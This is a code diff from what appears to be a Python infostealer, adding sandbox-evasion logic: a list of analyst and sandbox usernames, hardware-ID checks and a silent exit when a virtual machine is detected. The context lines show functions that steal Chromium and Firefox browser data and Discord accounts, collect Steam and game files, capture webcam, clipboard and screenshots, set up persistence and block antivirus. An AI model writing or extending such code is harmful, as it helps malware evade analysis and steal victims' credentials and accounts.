@@ -457,7 +457,7 @@ def screenshot():
     except:
         ss_success = 0
 
-def antivm(): # THIS IS UNFINISHED
+def anti_vm(): 
     vm_indicators = [
         "VBOX", "VIRTUALBOX", "VMWARE", "VIRTUAL", "HYPERV", "QEMU", "XEN", "PARALLELS"
     ]
@@ -466,7 +466,7 @@ def antivm(): # THIS IS UNFINISHED
             return True
     return False
 
-    blacklistedips = ['88.86.117.130', '34.172.125.33', '85.203.46.34', '85.203.46.153', '45.91.22.73', ]
+    vm_usernames = ['wdagutilityaccount', 'wdc', 'vboxuser', 'vmwareuser', 'administrator', 'user', 'test', 'guest', 'server', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm']
     sandboxuuids = [
         '1D1FB0BB-21B9-4FC0-B017-A4DADA231E17',
         '20DC9FCF-04F2-46DB-866A-8B094D51E731',
@@ -618,6 +618,10 @@ def antivm(): # THIS IS UNFINISHED
     ]
     if hwid in sandboxuuids:
         return True
+
+    if os.getenv('USERNAME').lower() in vm_usernames:
+        return True
+
     if psutil.process_iter(attrs=['name']):
         for process in psutil.process_iter(attrs=['name']):
             if process.info['name'] in blacklisted_processes:
@@ -1333,7 +1337,7 @@ else:
     copypath = sys.executable
 
 if config.antivm:
-    if is_vm():
+    if is_vm:
         sys.exit(0)
 
 if not isadmin():
@@ -1355,7 +1359,7 @@ e3.start()
 kill()
 thread = threading.Thread(target=persistence, args=(copypath,))
 thread.start()
-is_vm = antivm()
+is_vm = anti_vm()
 funcs = [systeminfo, get_webcam, get_clipboard, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
 # systeminfo()
 # screenshot()
